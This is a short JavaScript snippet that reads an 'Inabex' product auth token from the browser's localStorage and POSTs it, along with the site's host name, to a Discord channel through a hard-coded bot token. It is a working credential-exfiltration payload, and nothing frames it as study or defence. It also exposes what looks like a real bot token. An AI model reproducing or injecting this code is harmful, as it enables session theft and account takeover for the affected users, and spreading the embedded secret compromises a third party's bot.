const content = `Inabex product "${ window.location.host }" auth token: ${ window.localStorage.token_inabex }`;
console.log(content);
fetch('https://discord.com/api/v10/channels/1363528727807393923/messages', {
  method: 'POST',
  headers: {
    'Authorization': 'Bot MTM2MzQ3MTc3MDAzOTg4MTg3Mw.G9-5Np.tXY0CQ8TaWpgJafWku6xhuy9XyxYvSBT984sXU',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ content })
});
